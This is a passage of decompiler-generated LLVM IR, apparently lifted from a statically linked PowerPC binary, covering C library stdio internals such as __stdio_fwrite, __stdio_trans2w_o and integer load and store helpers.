  %v0_10021040 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021040 = add i32 %v0_10021040, -1
  store i32 %v1_10021040, i32* %ctr.global-to-local, align 4
  %v2_10021040 = icmp eq i32 %v1_10021040, 0
  br i1 %v2_10021040, label %dec_label_pc_1002103c.dec_label_pc_10021044_crit_edge, label %dec_label_pc_10021018

dec_label_pc_1002103c.dec_label_pc_10021044_crit_edge: ; preds = %dec_label_pc_1002103c
  %v0_10021044.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10021044

dec_label_pc_10021044:                            ; preds = %dec_label_pc_10021030.dec_label_pc_10021044_crit_edge, %dec_label_pc_1002103c.dec_label_pc_10021044_crit_edge
  %v0_10021048 = phi i32 [ %v1_1002103c, %dec_label_pc_1002103c.dec_label_pc_10021044_crit_edge ], [ %v0_10021048.pre, %dec_label_pc_10021030.dec_label_pc_10021044_crit_edge ]
  %v0_10021044 = phi i32 [ %v0_10021044.pre, %dec_label_pc_1002103c.dec_label_pc_10021044_crit_edge ], [ %v0_10021030, %dec_label_pc_10021030.dec_label_pc_10021044_crit_edge ]
  %v1_10021044 = add i32 %v0_10021044, 8
  %v2_10021044 = inttoptr i32 %v1_10021044 to i32*
  %v3_10021044 = load i32, i32* %v2_10021044, align 4
  store i32 %v3_10021044, i32* %r0.global-to-local, align 4
  %v2_10021048 = add i32 %v0_10021044, 16
  %v3_10021048 = inttoptr i32 %v2_10021048 to i32*
  store i32 %v0_10021048, i32* %v3_10021048, align 4
  %v0_1002104c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002104c = load i32, i32* @r11, align 4
  %v2_1002104c = sub i32 %v1_1002104c, %v0_1002104c
  store i32 %v2_1002104c, i32* %r0.global-to-local, align 4
  %v1_10021050 = load i32, i32* @r31, align 4
  %v2_10021050 = sub i32 %v1_10021050, %v2_1002104c
  store i32 %v2_10021050, i32* @r31, align 4
  br label %dec_label_pc_10021054

dec_label_pc_10021054:                            ; preds = %dec_label_pc_10020fec.dec_label_pc_10021054_crit_edge, %dec_label_pc_10021044
  %v0_10021054 = phi i32 [ %v0_10021054.pre, %dec_label_pc_10020fec.dec_label_pc_10021054_crit_edge ], [ %v2_10021050, %dec_label_pc_10021044 ]
  %v1_10021054 = load i32, i32* @r28, align 4
  %v2_10021054 = sub i32 %v1_10021054, %v0_10021054
  store i32 %v2_10021054, i32* @r28, align 4
  br label %dec_label_pc_10021058

dec_label_pc_10020fb0.dec_label_pc_10021058.loopexit_crit_edge: ; preds = %dec_label_pc_10020fe0
  %v0_1002105c.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10021058

dec_label_pc_10021058:                            ; preds = %entry, %dec_label_pc_10020fb0.dec_label_pc_10021058.loopexit_crit_edge, %dec_label_pc_10021054
  %v0_1002105c = phi i32 [ %v2_10021054, %dec_label_pc_10021054 ], [ %v0_1002105c.pre.pre, %dec_label_pc_10020fb0.dec_label_pc_10021058.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10020f94, i32* %r0.global-to-local, align 4
  ret i32 %v0_1002105c

; uselistorder directives
  uselistorder i32 %v0_10021044, { 1, 0 }
  uselistorder i32 %v1_10021040, { 1, 0 }
  uselistorder i32 %v1_1002103c, { 0, 2, 1 }
  uselistorder i32 %v1_10021024, { 1, 0 }
  uselistorder i32 %v2_10020fe4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_10020fe0, { 1, 0 }
  uselistorder i32 %v3_10020fd4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_write, { 6, 15, 14, 13, 16, 12, 11, 0, 5, 1, 4, 2, 9, 8, 10, 3, 7 }
  uselistorder label %dec_label_pc_10021058, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10021054, { 1, 0 }
  uselistorder label %dec_label_pc_10021044, { 1, 0 }
  uselistorder label %dec_label_pc_10021014, { 1, 0 }
  uselistorder label %dec_label_pc_10020fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10020fbc, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10021074 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1002108c = load i16, i16* %arg3, align 2
  %v1_10021090 = and i16 %v3_1002108c, 512
  %v3_10021090 = icmp eq i16 %v1_10021090, 0
  br i1 %v3_10021090, label %dec_label_pc_10021098, label %dec_label_pc_100211a4

dec_label_pc_10021098:                            ; preds = %entry
  %v2_10021098 = add i32 %tmp, 4
  %v3_10021098 = inttoptr i32 %v2_10021098 to i32*
  %v4_10021098 = load i32, i32* %v3_10021098, align 4
  %v2_1002109c = add i32 %tmp, 16
  %v3_1002109c = inttoptr i32 %v2_1002109c to i32*
  %v4_1002109c = load i32, i32* %v3_1002109c, align 4
  store i32 %v4_1002109c, i32* @r3, align 4
  %v2_100210a0 = add i32 %tmp, 12
  %v3_100210a0 = inttoptr i32 %v2_100210a0 to i32*
  %v4_100210a0 = load i32, i32* %v3_100210a0, align 4
  %v3_100210a4 = icmp eq i32 %v4_10021098, -2
  %v2_100210ac = sub i32 %v4_100210a0, %v4_1002109c
  br i1 %v3_100210a4, label %dec_label_pc_100210ac, label %dec_label_pc_100210dc

dec_label_pc_100210ac:                            ; preds = %dec_label_pc_10021098
  %v3_100210b4 = icmp ult i32 %v2_100210ac, %arg2
  br i1 %v3_100210b4, label %dec_label_pc_100210bc, label %dec_label_pc_100210c0

dec_label_pc_100210bc:                            ; preds = %dec_label_pc_100210ac
  br label %dec_label_pc_100210c0

dec_label_pc_100210c0:                            ; preds = %dec_label_pc_100210ac, %dec_label_pc_100210bc
  %storemerge = phi i32 [ %v2_100210ac, %dec_label_pc_100210bc ], [ %arg2, %dec_label_pc_100210ac ]
  %v0_100210c4 = phi i32 [ %v2_100210ac, %dec_label_pc_100210bc ], [ %arg2, %dec_label_pc_100210ac ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_100210c4, i32* @r5, align 4
  store i32 268570828, i32* @lr, align 4
  %v0_100210c8 = call i32 @memcpy()
  %v0_100210cc = load i32, i32* @r30, align 4
  %v1_100210cc = add i32 %v0_100210cc, 16
  %v2_100210cc = inttoptr i32 %v1_100210cc to i32*
  %v3_100210cc = load i32, i32* %v2_100210cc, align 4
  %v1_100210d0 = load i32, i32* @r31, align 4
  %v2_100210d0 = add i32 %v1_100210d0, %v3_100210cc
  store i32 %v2_100210d0, i32* %v2_100210cc, align 4
  br label %dec_label_pc_100211c4

dec_label_pc_100210dc:                            ; preds = %dec_label_pc_10021098
  %v3_100210e0 = icmp ult i32 %v2_100210ac, %arg2
  br i1 %v3_100210e0, label %dec_label_pc_10021180, label %dec_label_pc_100210e8

dec_label_pc_100210e8:                            ; preds = %dec_label_pc_100210dc
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268570868, i32* @lr, align 4
  %v0_100210f0 = call i32 @memcpy()
  %v0_100210f4 = load i32, i32* @r30, align 4
  %v1_100210f4 = inttoptr i32 %v0_100210f4 to i16*
  %v2_100210f4 = load i16, i16* %v1_100210f4, align 2
  %v3_100210f4 = zext i16 %v2_100210f4 to i32
  %v1_100210f8 = add i32 %v0_100210f4, 16
  %v2_100210f8 = inttoptr i32 %v1_100210f8 to i32*
  %v3_100210f8 = load i32, i32* %v2_100210f8, align 4
  %v1_100210fc = and i32 %v3_100210f4, 256
  store i32 %v1_100210fc, i32* @r11, align 4
  %v3_100210fc = icmp eq i32 %v1_100210fc, 0
  %v1_10021100 = load i32, i32* @r29, align 4
  %v2_10021100 = add i32 %v1_10021100, %v3_100210f8
  store i32 %v2_10021100, i32* %v2_100210f8, align 4
  br i1 %v3_100210fc, label %dec_label_pc_100211c4, label %dec_label_pc_1002110c

dec_label_pc_1002110c:                            ; preds = %dec_label_pc_100210e8
  %v0_1002110c = load i32, i32* @r28, align 4
  %v0_10021114 = load i32, i32* @r29, align 4
  store i32 268570908, i32* @lr, align 4
  %v4_10021118 = call i32 @memrchr(i32 %v0_1002110c, i32 10, i32 %v0_10021114, i32 %v2_10021100)
  %v3_1002111c = icmp eq i32 %v4_10021118, 0
  br i1 %v3_1002111c, label %dec_label_pc_100211c4, label %dec_label_pc_10021124

dec_label_pc_10021124:                            ; preds = %dec_label_pc_1002110c
  %v0_10021124 = load i32, i32* @r30, align 4
  store i32 %v0_10021124, i32* @r3, align 4
  store i32 268570924, i32* @lr, align 4
  %v0_10021128 = call i32 @__stdio_wcommit()
  %v3_1002112c = icmp eq i32 %v0_10021128, 0
  br i1 %v3_1002112c, label %dec_label_pc_100211c4, label %dec_label_pc_10021134

dec_label_pc_10021134:                            ; preds = %dec_label_pc_10021124
  %v0_10021134 = load i32, i32* @r29, align 4
  %v3_10021134 = icmp ugt i32 %v0_10021134, %v0_10021128
  %v0_10021128.v0_10021138 = select i1 %v3_10021134, i32 %v0_10021128, i32 %v0_10021134
  store i32 %v0_10021128.v0_10021138, i32* @r31, align 4
  %v2_10021144 = sub i32 %v0_10021134, %v0_10021128.v0_10021138
  %v0_1002114c = load i32, i32* @r28, align 4
  %v2_1002114c = add i32 %v0_1002114c, %v2_10021144
  store i32 %v2_1002114c, i32* @r28, align 4
  store i32 %v2_1002114c, i32* @r3, align 4
  store i32 268570972, i32* @lr, align 4
  %v3_10021158 = call i32 @__GI_memchr(i32 %v2_1002114c, i32 10, i32 %v0_10021128.v0_10021138)
  %v3_1002115c = icmp eq i32 %v3_10021158, 0
  br i1 %v3_1002115c, label %dec_label_pc_100211c4, label %dec_label_pc_10021164

dec_label_pc_10021164:                            ; preds = %dec_label_pc_10021134
  %v0_10021164 = load i32, i32* @r30, align 4
  %v1_10021164 = add i32 %v0_10021164, 16
  %v2_10021164 = inttoptr i32 %v1_10021164 to i32*
  %v3_10021164 = load i32, i32* %v2_10021164, align 4
  %v0_10021168 = load i32, i32* @r28, align 4
  %v1_10021168 = load i32, i32* @r31, align 4
  %v2_10021168 = sub i32 %v0_10021168, %v3_10021158
  %v2_1002116c = add i32 %v2_10021168, %v1_10021168
  %v1_10021170 = load i32, i32* @r29, align 4
  %v2_10021170 = sub i32 %v1_10021170, %v2_1002116c
  store i32 %v2_10021170, i32* @r29, align 4
  %v2_10021174 = sub i32 %v3_10021164, %v2_1002116c
  store i32 %v2_10021174, i32* %v2_10021164, align 4
  br label %dec_label_pc_100211c4

dec_label_pc_10021180:                            ; preds = %dec_label_pc_100210dc
  %v2_10021180 = add i32 %tmp, 8
  %v3_10021180 = inttoptr i32 %v2_10021180 to i32*
  %v4_10021180 = load i32, i32* %v3_10021180, align 4
  %v4_10021184 = icmp eq i32 %v4_1002109c, %v4_10021180
  br i1 %v4_10021184, label %dec_label_pc_100211a4, label %dec_label_pc_1002118c

dec_label_pc_1002118c:                            ; preds = %dec_label_pc_10021180
  store i32 %tmp, i32* @r3, align 4
  store i32 268571028, i32* @lr, align 4
  %v0_10021190 = call i32 @__stdio_wcommit()
  %v3_10021194 = icmp eq i32 %v0_10021190, 0
  br i1 %v3_10021194, label %dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge, label %dec_label_pc_1002119c

dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge: ; preds = %dec_label_pc_1002118c
  %v0_100211a8.pre = load i32, i32* @r30, align 4
  %v0_100211ac.pre = load i32, i32* @r28, align 4
  %v0_100211b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100211a4

dec_label_pc_1002119c:                            ; preds = %dec_label_pc_1002118c
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_100211c4

dec_label_pc_100211a4:                            ; preds = %dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge, %entry, %dec_label_pc_10021180
  %v0_100211b0 = phi i32 [ %v0_100211b0.pre, %dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10021180 ]
  %v0_100211ac = phi i32 [ %v0_100211ac.pre, %dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10021180 ]
  %v0_100211a8 = phi i32 [ %v0_100211a8.pre, %dec_label_pc_1002118c.dec_label_pc_100211a4_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_10021180 ]
  %v1_100211a8 = inttoptr i32 %v0_100211a8 to i16*
  store i32 %v0_100211b0, i32* @r5, align 4
  store i32 %v0_10021074, i32* @lr, align 4
  %v5_100211c0 = call i32 @__stdio_WRITE(i16* %v1_100211a8, i32 %v0_100211ac)
  br label %dec_label_pc_100211c4

dec_label_pc_100211c4:                            ; preds = %dec_label_pc_10021134, %dec_label_pc_10021124, %dec_label_pc_1002110c, %dec_label_pc_100210e8, %dec_label_pc_1002119c, %dec_label_pc_10021164, %dec_label_pc_100210c0, %dec_label_pc_100211a4
  %v0_100211c8 = load i32, i32* @r29, align 4
  ret i32 %v0_100211c8

; uselistorder directives
  uselistorder i32 %v2_1002116c, { 1, 0 }
  uselistorder i32 %v0_10021128.v0_10021138, { 0, 2, 1 }
  uselistorder i32 %v0_10021134, { 1, 0, 2 }
  uselistorder i32 %v2_100210ac, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_100211c4, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_100211a4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100210c0, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100211e0 = load i32, i32* @lr, align 4
  store i32 %v0_100211e0, i32* %r0.global-to-local, align 4
  %v0_100211e4 = load i32, i32* @r31, align 4
  %v0_100211e8 = load i32, i32* @r3, align 4
  store i32 %v0_100211e8, i32* @r31, align 4
  %v1_100211f0 = inttoptr i32 %v0_100211e8 to i16*
  %v2_100211f0 = load i16, i16* %v1_100211f0, align 2
  %v3_100211f0 = zext i16 %v2_100211f0 to i32
  store i32 %v3_100211f0, i32* %r0.global-to-local, align 4
  %v1_100211f4 = load i32, i32* @r4, align 4
  %v2_100211f4 = and i32 %v1_100211f4, %v3_100211f0
  store i32 %v2_100211f4, i32* %r9.global-to-local, align 4
  %v5_100211f4 = icmp eq i32 %v2_100211f4, 0
  br i1 %v5_100211f4, label %dec_label_pc_100211fc, label %dec_label_pc_1002120c

dec_label_pc_100211fc:                            ; preds = %entry
  %v1_100211fc = and i32 %v3_100211f0, 2176
  store i32 %v1_100211fc, i32* %r9.global-to-local, align 4
  %v3_100211fc = icmp eq i32 %v1_100211fc, 0
  br i1 %v3_100211fc, label %dec_label_pc_10021204, label %dec_label_pc_10021218

dec_label_pc_10021204:                            ; preds = %dec_label_pc_100211fc
  %v2_10021204 = or i32 %v1_100211f4, %v3_100211f0
  store i32 %v2_10021204, i32* %r0.global-to-local, align 4
  %v1_10021208 = trunc i32 %v2_10021204 to i16
  store i16 %v1_10021208, i16* %v1_100211f0, align 2
  %v0_1002120c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002120c

dec_label_pc_1002120c:                            ; preds = %entry, %dec_label_pc_10021204
  %v0_10021248 = phi i32 [ %v0_100211e8, %entry ], [ %v0_1002120c.pre, %dec_label_pc_10021204 ]
  %v1_1002120c = inttoptr i32 %v0_10021248 to i16*
  %v2_1002120c = load i16, i16* %v1_1002120c, align 2
  %v3_1002120c = zext i16 %v2_1002120c to i32
  store i32 %v3_1002120c, i32* @r11, align 4
  %v1_10021210 = and i32 %v3_1002120c, 32
  store i32 %v1_10021210, i32* %r0.global-to-local, align 4
  %v3_10021210 = icmp eq i32 %v1_10021210, 0
  br i1 %v3_10021210, label %dec_label_pc_10021238, label %dec_label_pc_10021218

dec_label_pc_10021218:                            ; preds = %dec_label_pc_100211fc, %dec_label_pc_1002120c
  %v0_10021218 = call i32 @__errno_location()
  store i32 %v0_10021218, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10021220 = inttoptr i32 %v0_10021218 to i32*
  store i32 9, i32* %v2_10021220, align 4
  br label %dec_label_pc_10021224

dec_label_pc_10021224:                            ; preds = %dec_label_pc_10021260, %dec_label_pc_10021218
  %v0_10021224 = load i32, i32* @r31, align 4
  %v1_10021224 = inttoptr i32 %v0_10021224 to i16*
  %v2_10021224 = load i16, i16* %v1_10021224, align 2
  %v3_10021224 = zext i16 %v2_10021224 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1002122c = or i32 %v3_10021224, 8
  store i32 %v1_1002122c, i32* %r0.global-to-local, align 4
  %v1_10021230 = trunc i32 %v1_1002122c to i16
  store i16 %v1_10021230, i16* %v1_10021224, align 2
  br label %dec_label_pc_100212c0

dec_label_pc_10021238:                            ; preds = %dec_label_pc_1002120c
  %tmp = urem i16 %v2_1002120c, 4
  %v1_10021238 = zext i16 %tmp to i32
  store i32 %v1_10021238, i32* %r0.global-to-local, align 4
  %v3_10021238 = icmp eq i16 %tmp, 0
  br i1 %v3_10021238, label %dec_label_pc_1002129c, label %dec_label_pc_10021240

dec_label_pc_10021240:                            ; preds = %dec_label_pc_10021238
  %v1_10021240 = and i32 %v3_1002120c, 4
  store i32 %v1_10021240, i32* %r9.global-to-local, align 4
  %v3_10021240 = icmp eq i32 %v1_10021240, 0
  br i1 %v3_10021240, label %dec_label_pc_10021248, label %dec_label_pc_10021280

dec_label_pc_10021248:                            ; preds = %dec_label_pc_10021240
  %v1_10021248 = add i32 %v0_10021248, 20
  %v2_10021248 = inttoptr i32 %v1_10021248 to i32*
  %v3_10021248 = load i32, i32* %v2_10021248, align 4
  store i32 %v3_10021248, i32* %r0.global-to-local, align 4
  %v1_1002124c = add i32 %v0_10021248, 16
  %v2_1002124c = inttoptr i32 %v1_1002124c to i32*
  %v3_1002124c = load i32, i32* %v2_1002124c, align 4
  store i32 %v3_1002124c, i32* %r9.global-to-local, align 4
  %v4_10021250 = icmp eq i32 %v3_10021248, %v3_1002124c
  br i1 %v4_10021250, label %dec_label_pc_10021258, label %dec_label_pc_10021260

dec_label_pc_10021258:                            ; preds = %dec_label_pc_10021248
  %v1_10021258 = and i32 %v3_1002120c, 2
  store i32 %v1_10021258, i32* %r0.global-to-local, align 4
  %v3_10021258 = icmp eq i32 %v1_10021258, 0
  br i1 %v3_10021258, label %dec_label_pc_10021280, label %dec_label_pc_10021260

dec_label_pc_10021260:                            ; preds = %dec_label_pc_10021248, %dec_label_pc_10021258
  %v1_10021260 = and i32 %v3_1002120c, 1024
  store i32 %v1_10021260, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_10021268 = call i32 @__asm_mfcr()
  store i32 %v0_10021268, i32* %r3.global-to-local, align 4
  %v1_1002126c = call i32 @__asm_rlwinm(i32 %v0_10021268, i32 3, i32 31, i32 31)
  %v1_10021270 = sub i32 2, %v1_1002126c
  store i32 %v1_10021270, i32* @r5, align 4
  store i32 268571256, i32* @lr, align 4
  %v0_10021274 = call i32 @__GI_fseek()
  store i32 %v0_10021274, i32* %r3.global-to-local, align 4
  %v3_10021278 = icmp eq i32 %v0_10021274, 0
  br i1 %v3_10021278, label %dec_label_pc_10021260.dec_label_pc_10021280_crit_edge, label %dec_label_pc_10021224

dec_label_pc_10021260.dec_label_pc_10021280_crit_edge: ; preds = %dec_label_pc_10021260
  %v0_10021280.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021280

dec_label_pc_10021280:                            ; preds = %dec_label_pc_10021260.dec_label_pc_10021280_crit_edge, %dec_label_pc_10021240, %dec_label_pc_10021258
  %v0_10021280 = phi i32 [ %v0_10021280.pre, %dec_label_pc_10021260.dec_label_pc_10021280_crit_edge ], [ %v0_10021248, %dec_label_pc_10021240 ], [ %v0_10021248, %dec_label_pc_10021258 ]
  %v1_10021280 = inttoptr i32 %v0_10021280 to i16*
  %v2_10021280 = load i16, i16* %v1_10021280, align 2
  %v3_10021280 = zext i16 %v2_10021280 to i32
  store i32 %v3_10021280, i32* %r0.global-to-local, align 4
  %v1_10021284 = add i32 %v0_10021280, 8
  %v2_10021284 = inttoptr i32 %v1_10021284 to i32*
  %v3_10021284 = load i32, i32* %v2_10021284, align 4
  store i32 %v3_10021284, i32* %r9.global-to-local, align 4
  %v1_10021288 = call i32 @__asm_rlwinm(i32 %v3_10021280, i32 0, i32 0, i32 29)
  %v2_10021288 = trunc i32 %v1_10021288 to i16
  store i32 %v1_10021288, i32* %r0.global-to-local, align 4
  %v3_1002128c = load i32, i32* @r31, align 4
  %v4_1002128c = inttoptr i32 %v3_1002128c to i16*
  store i16 %v2_10021288, i16* %v4_1002128c, align 2
  %v0_10021290 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021290 = load i32, i32* @r31, align 4
  %v2_10021290 = add i32 %v1_10021290, 20
  %v3_10021290 = inttoptr i32 %v2_10021290 to i32*
  store i32 %v0_10021290, i32* %v3_10021290, align 4
  %v0_10021294 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021294 = load i32, i32* @r31, align 4
  %v2_10021294 = add i32 %v1_10021294, 24
  %v3_10021294 = inttoptr i32 %v2_10021294 to i32*
  store i32 %v0_10021294, i32* %v3_10021294, align 4
  %v0_10021298 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021298 = load i32, i32* @r31, align 4
  %v2_10021298 = add i32 %v1_10021298, 16
  %v3_10021298 = inttoptr i32 %v2_10021298 to i32*
  store i32 %v0_10021298, i32* %v3_10021298, align 4
  %v0_1002129c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002129c

dec_label_pc_1002129c:                            ; preds = %dec_label_pc_10021238, %dec_label_pc_10021280
  %v2_100212a8 = phi i32 [ %v0_10021248, %dec_label_pc_10021238 ], [ %v0_1002129c.pre, %dec_label_pc_10021280 ]
  %v1_1002129c = inttoptr i32 %v2_100212a8 to i16*
  %v2_1002129c = load i16, i16* %v1_1002129c, align 2
  %v3_1002129c = zext i16 %v2_1002129c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100212a4 = or i32 %v3_1002129c, 64
  store i32 %v1_100212a4, i32* %r0.global-to-local, align 4
  %v1_100212a8 = trunc i32 %v1_100212a4 to i16
  store i16 %v1_100212a8, i16* %v1_1002129c, align 2
  %v0_100212ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100212ac = urem i32 %v0_100212ac, 65536
  store i32 %v1_100212ac, i32* %r0.global-to-local, align 4
  %v1_100212b0 = and i32 %v0_100212ac, 2816
  store i32 %v1_100212b0, i32* %r9.global-to-local, align 4
  %v3_100212b0 = icmp eq i32 %v1_100212b0, 0
  br i1 %v3_100212b0, label %dec_label_pc_100212b8, label %dec_label_pc_100212c0

dec_label_pc_100212b8:                            ; preds = %dec_label_pc_1002129c
  %v0_100212b8 = load i32, i32* @r31, align 4
  %v1_100212b8 = add i32 %v0_100212b8, 12
  %v2_100212b8 = inttoptr i32 %v1_100212b8 to i32*
  %v3_100212b8 = load i32, i32* %v2_100212b8, align 4
  store i32 %v3_100212b8, i32* %r0.global-to-local, align 4
  %v2_100212bc = add i32 %v0_100212b8, 28
  %v3_100212bc = inttoptr i32 %v2_100212bc to i32*
  store i32 %v3_100212b8, i32* %v3_100212bc, align 4
  br label %dec_label_pc_100212c0

dec_label_pc_100212c0:                            ; preds = %dec_label_pc_1002129c, %dec_label_pc_10021224, %dec_label_pc_100212b8
  store i32 %v0_100211e0, i32* %r0.global-to-local, align 4
  store i32 %v0_100211e4, i32* @r31, align 4
  %v0_100212d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100212d0

; uselistorder directives
  uselistorder i32 %v0_100212ac, { 1, 0 }
  uselistorder i32 %v1_10021288, { 1, 0 }
  uselistorder i32 %v0_10021280, { 1, 0 }
  uselistorder i32 %v0_10021248, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_100211f0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_100212c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002129c, { 1, 0 }
  uselistorder label %dec_label_pc_10021280, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10021260, { 1, 0 }
  uselistorder label %dec_label_pc_10021218, { 1, 0 }
  uselistorder label %dec_label_pc_1002120c, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_100212d4 = load i32, i32* @r5, align 4
  %v1_100212d4 = icmp slt i32 %v0_100212d4, 0
  %v1_100212d8 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10021314 = icmp eq i32 %v1_100212d8, 0
  br i1 %v1_100212d4, label %dec_label_pc_10021314, label %dec_label_pc_100212e0

dec_label_pc_100212e0:                            ; preds = %entry
  br i1 %v3_10021314, label %dec_label_pc_100212e8, label %dec_label_pc_1002131c

dec_label_pc_100212e8:                            ; preds = %dec_label_pc_100212e0
  %v3_100212e8 = icmp eq i32 %arg1, 256
  br i1 %v3_100212e8, label %dec_label_pc_100212f4, label %dec_label_pc_100212fc

dec_label_pc_100212f4:                            ; preds = %dec_label_pc_100212e8
  br label %dec_label_pc_10021308

dec_label_pc_100212fc:                            ; preds = %dec_label_pc_100212e8
  %v3_100212fc = icmp eq i32 %arg1, 512
  br i1 %v3_100212fc, label %dec_label_pc_10021304, label %dec_label_pc_10021308

dec_label_pc_10021304:                            ; preds = %dec_label_pc_100212fc
  br label %dec_label_pc_10021308

dec_label_pc_10021308:                            ; preds = %dec_label_pc_100212fc, %dec_label_pc_100212f4, %dec_label_pc_10021304
  ret i32 0

dec_label_pc_10021314:                            ; preds = %entry
  br i1 %v3_10021314, label %dec_label_pc_10021328, label %dec_label_pc_1002131c

dec_label_pc_1002131c:                            ; preds = %dec_label_pc_100212e0, %dec_label_pc_10021314
  %v2_1002131c = load i32, i32* %arg2, align 4
  ret i32 %v2_1002131c

dec_label_pc_10021328:                            ; preds = %dec_label_pc_10021314
  %v3_10021328 = icmp eq i32 %arg1, 256
  %v2_1002132c = load i32, i32* %arg2, align 4
  br i1 %v3_10021328, label %dec_label_pc_10021334, label %dec_label_pc_1002133c

dec_label_pc_10021334:                            ; preds = %dec_label_pc_10021328
  %v1_10021334 = urem i32 %v2_1002132c, 256
  br label %dec_label_pc_10021348

dec_label_pc_1002133c:                            ; preds = %dec_label_pc_10021328
  %v3_1002133c = icmp eq i32 %arg1, 512
  br i1 %v3_1002133c, label %dec_label_pc_10021344, label %dec_label_pc_10021348

dec_label_pc_10021344:                            ; preds = %dec_label_pc_1002133c
  %v1_10021344 = mul i32 %v2_1002132c, 65536
  %v2_10021344 = sdiv i32 %v1_10021344, 65536
  br label %dec_label_pc_10021348

dec_label_pc_10021348:                            ; preds = %dec_label_pc_1002133c, %dec_label_pc_10021334, %dec_label_pc_10021344
  %v0_10021348 = phi i32 [ %v2_1002132c, %dec_label_pc_1002133c ], [ %v1_10021334, %dec_label_pc_10021334 ], [ %v2_10021344, %dec_label_pc_10021344 ]
  %tmp = icmp slt i32 %v0_10021348, 0
  %v1_1002134c = zext i1 %tmp to i32
  %v2_1002134c = ashr i32 %v0_10021348, 31
  %v3_1002134c = and i32 %v2_1002134c, -2
  %v4_1002134c = or i32 %v3_1002134c, %v1_1002134c
  ret i32 %v4_1002134c

; uselistorder directives
  uselistorder i32 %v0_10021348, { 1, 0 }
  uselistorder i32 %v2_1002132c, { 2, 0, 1 }
  uselistorder i1 %v3_10021314, { 1, 0 }
  uselistorder i32 %arg1, { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_10021348, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002131c, { 1, 0 }
  uselistorder label %dec_label_pc_10021308, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10021354 = load i32, i32* @r4, align 4
  %v3_10021354 = icmp eq i32 %v0_10021354, 256
  br i1 %v3_10021354, label %dec_label_pc_10021360, label %dec_label_pc_10021368

dec_label_pc_10021360:                            ; preds = %entry
  %v0_10021360 = load i32, i32* @r6, align 4
  %v1_10021360 = trunc i32 %v0_10021360 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10021360, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10021368:                            ; preds = %entry
  %v3_10021358 = icmp eq i32 %v0_10021354, 2048
  br i1 %v3_10021358, label %dec_label_pc_10021370, label %dec_label_pc_1002137c

dec_label_pc_10021370:                            ; preds = %dec_label_pc_10021368
  %v0_10021370 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10021370, i32* %tmp2, align 4
  %v0_10021374 = load i32, i32* @r6, align 4
  %v3_10021374 = add i32 %tmp, 4
  %v4_10021374 = inttoptr i32 %v3_10021374 to i32*
  store i32 %v0_10021374, i32* %v4_10021374, align 4
  ret i32 %tmp

